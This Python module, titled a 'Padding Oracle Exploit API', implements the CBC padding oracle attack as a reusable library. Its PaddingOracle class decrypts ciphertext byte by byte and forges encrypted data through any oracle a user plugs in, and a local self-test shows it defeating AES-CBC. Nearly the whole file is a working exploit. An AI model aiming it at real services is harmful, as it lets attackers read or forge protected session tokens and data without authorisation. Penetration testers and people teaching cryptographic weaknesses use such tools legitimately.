# -*- coding: utf-8 -*-
'''
Padding Oracle Exploit API
~~~~~~~~~~~~~~~~~~~~~~~~~~
'''
from Crypto.Util.Padding import pad, unpad
from itertools import cycle
import logging

__all__ = [
    'BadPaddingException',
    'PaddingOracle',
    ]


class BadPaddingException(Exception):
    '''
    Raised when a blackbox decryptor reveals a padding oracle.

    This Exception type should be raised in :meth:`.PaddingOracle.oracle`.
    '''


class PaddingOracle(object):
    '''
    Implementations should subclass this object and implement
    the :meth:`oracle` method.

    :param int max_retries: Number of attempts per byte to reveal a
        padding oracle, default is 3. If an oracle does not reveal
        itself within `max_retries`, a :exc:`RuntimeError` is raised.
    '''

    def __init__(self, **kwargs):
        self.log = logging.getLogger(self.__class__.__name__)
        self.max_retries = int(kwargs.get('max_retries', 3))
        self.attempts = 0
        self.history = []
        self._decrypted = None
        self._encrypted = None

    def oracle(self, data, **kwargs):
        '''
        Feeds *data* to a decryption function that reveals a Padding
        Oracle. If a Padding Oracle was revealed, this method
        should raise a :exc:`.BadPaddingException`, otherwise this
        method should just return.

        A history of all responses should be stored in :attr:`~.history`,
        regardless of whether they revealed a Padding Oracle or not.
        Responses from :attr:`~.history` are fed to :meth:`analyze` to
        help identify padding oracles.

        :param bytearray data: A bytearray of (fuzzed) encrypted bytes.
        :raises: :class:`BadPaddingException` if decryption reveals an
            oracle.
        '''
        raise NotImplementedError

    def analyze(self, **kwargs):
        '''
        This method analyzes return :meth:`oracle` values stored in
        :attr:`~.history` and returns the most likely
        candidate(s) that reveals a padding oracle.
        '''
        raise NotImplementedError

    def encrypt(self, plaintext, block_size=16, iv=None, **kwargs):
        '''
        Encrypts *plaintext* by exploiting a Padding Oracle.

        :param plaintext: Plaintext data to encrypt.
        :param int block_size: Cipher block size (in bytes).
        :param iv: The initialization vector (iv), usually the first
            *block_size* bytes from the ciphertext. If no iv is given
            or iv is None, the first *block_size* bytes will be null's.
        :returns: Encrypted data.
        '''
        plaintext = bytearray(pad(plaintext, block_size))

        self.log.debug(f'Attempting to encrypt {plaintext} bytes')

        if iv is not None:
            iv = bytearray(iv)
        else:
            iv = bytearray(block_size)

        self._encrypted = encrypted = iv
        block = encrypted

        n = len(plaintext + iv)
        while n > 0:
            intermediate_bytes = self.bust(block, block_size=block_size, **kwargs)

            block = xor(intermediate_bytes,
                        plaintext[n - block_size * 2:n + block_size])

            encrypted = block + encrypted

            n -= block_size

        return encrypted

    def decrypt(self, ciphertext, block_size=16, iv=None, **kwargs):
        '''
        Decrypts *ciphertext* by exploiting a Padding Oracle.

        :param ciphertext: Encrypted data.
        :param int block_size: Cipher block size (in bytes).
        :param iv: The initialization vector (iv), usually the first
            *block_size* bytes from the ciphertext. If no iv is given
            or iv is None, the first *block_size* bytes will be used.
        :returns: Decrypted data.
        '''
        ciphertext = bytearray(ciphertext)

        self.log.debug(f'Attempting to decrypt {ciphertext.hex()} bytes')

        assert len(ciphertext) % block_size == 0, f'Ciphertext not of block size {block_size}'

        if iv is not None:
            iv, ctext = bytearray(iv), ciphertext
        else:
            iv, ctext = ciphertext[:block_size], ciphertext[block_size:]

        self._decrypted = decrypted = bytearray(len(ctext))

        n = 0
        while ctext:
            block, ctext = ctext[:block_size], ctext[block_size:]

            intermediate_bytes = self.bust(block, block_size=block_size, **kwargs)

            # XOR the intermediate bytes with the the previous block (iv)
            # to get the plaintext

            decrypted[n:n + block_size] = xor(intermediate_bytes, iv)

            self.log.info(f'Decrypted block {n // block_size}: {str(decrypted[n:n + block_size])}')

            # Update the IV to that of the current block to be used in the
            # next round

            iv = block
            n += block_size

        return decrypted

    def bust(self, block, block_size=16, **kwargs):
        '''
        A block buster. This method busts one ciphertext block at a time.
        This method should not be called directly, instead use
        :meth:`decrypt`.

        :param block:
        :param int block_size: Cipher block size (in bytes).
        :returns: A bytearray containing the decrypted bytes
        '''
        intermediate_bytes = bytearray(block_size)

        test_bytes = bytearray(block_size) # '\x00\x00\x00\x00...'
        test_bytes.extend(block)

        self.log.debug(f'Processing block {block.hex()}')

        retries = 0
        last_ok = 0
        while retries < self.max_retries:

            # Work on one byte at a time, starting with the last byte
            # and moving backwards

            for byte_num in reversed(range(block_size)):

                # clear oracle history for each byte

                self.history = []

                # Break on first value that returns an oracle, otherwise if we
                # don't find a good value it means we have a false positive
                # value for the last byte and we need to start all over again
                # from the last byte. We can resume where we left off for the
                # last byte though.

                r = 256
                if byte_num == block_size - 1 and last_ok > 0:
                    r = last_ok

                for i in reversed(range(r)):

                    # Fuzz the test byte

                    test_bytes[byte_num] = i

                    # If a padding oracle could not be identified from the
                    # response, this indicates the padding bytes we sent
                    # were correct.

                    try:
                        self.attempts += 1
                        self.oracle(test_bytes[:], **kwargs)

                        if byte_num == block_size - 1:
                            last_ok = i

                    except BadPaddingException:

                        # TODO
                        # if a padding oracle was seen in the response,
                        # do not go any further, try the next byte in the
                        # sequence. If we're in analysis mode, re-raise the
                        # BadPaddingException.

                        if self.analyze is True:
                            raise
                        else:
                            continue

                    except Exception:
                        self.log.exception(f'Caught unhandled exception!\n'
                                           f'Decrypted bytes so far: {intermediate_bytes}\n'
                                           f'Current variables: {self.__dict__}\n')
                        raise

                    current_pad_byte = block_size - byte_num
                    next_pad_byte = block_size - byte_num + 1
                    decrypted_byte = test_bytes[byte_num] ^ current_pad_byte

                    intermediate_bytes[byte_num] = decrypted_byte

                    for k in range(byte_num, block_size):

                        # XOR the current test byte with the padding value
                        # for this round to recover the decrypted byte

                        test_bytes[k] ^= current_pad_byte

                        # XOR it again with the padding byte for the
                        # next round

                        test_bytes[k] ^= next_pad_byte

                    break

                else:
                    self.log.debug(f'byte {byte_num} not found, restarting...')
                    retries += 1

                    break
            else:
                break

        else:
            raise RuntimeError(f'Could not decrypt byte {byte_num} in {block} within '
                               f'maximum allotted retries ({self.max_retries})')

        return intermediate_bytes


def xor(data, key):
    '''
    XOR two bytearray objects with each other.
    '''
    return bytearray([x ^ y for x, y in zip(data, cycle(key))])


def test():
    import os
    from Crypto.Cipher import AES

    # logging.basicConfig(level=logging.DEBUG)

    teststring = b'The quick brown fox jumped over the lazy dog'

    def pkcs7_pad(data, blklen=16):
        if blklen > 255:
            raise ValueError(f'Illegal block size {blklen}')
        ppad = (blklen - (len(data) % blklen))
        return data + bytes([ppad]) * ppad

    class PadBuster(PaddingOracle):
        def oracle(self, data):
            _cipher = AES.new(key, AES.MODE_CBC, iv)
            ptext = _cipher.decrypt(data)
            plen = int(ptext[-1:].hex(), 16)

            padding_is_good = (ptext[-plen:] == bytes([plen]) * plen)

            if padding_is_good:
                logging.debug(f'No padding exception raised on {data.hex()}')
                return

            raise BadPaddingException

    padbuster = PadBuster()

    for _ in range(10):
        key = os.urandom(AES.block_size)
        iv = os.urandom(AES.block_size)

        print('Testing padding oracle exploit in DECRYPT mode')
        cipher = AES.new(key, AES.MODE_CBC, iv)

        data = pkcs7_pad(teststring, blklen=AES.block_size)
        ctext = cipher.encrypt(data)

        print(f'Key:        {key}')
        print(f'IV:         {iv}')
        print(f'Plaintext:  {data}')
        print(f'Ciphertext: {ctext}')

        decrypted = padbuster.decrypt(ctext, block_size=AES.block_size, iv=iv)
        decrypted = bytes(decrypted)

        print(f'Decrypted:  {decrypted}')
        print(f'\nRecovered in {padbuster.attempts} attempts\n')

        assert decrypted == data, f'Decrypted data {decrypted} does not match original {data}'

        print('Testing padding oracle exploit in ENCRYPT mode')
        cipher2 = AES.new(key, AES.MODE_CBC, iv)

        encrypted = padbuster.encrypt(teststring, block_size=AES.block_size)

        print(f'Key:        {key}')
        print(f'IV:         {iv}')
        print(f'Plaintext:  {teststring}')
        print(f'Ciphertext: {encrypted}')

        decrypted = cipher2.decrypt(encrypted)[AES.block_size:]
        decrypted = unpad(decrypted, AES.block_size)

        print(f'Decrypted:  {decrypted}')
        print(f'\nRecovered in {padbuster.attempts} attempts')

        assert decrypted == teststring, f'Encrypted data {encrypted} does not decrypt to {teststring}, got {decrypted}'


if __name__ == '__main__':
    test()
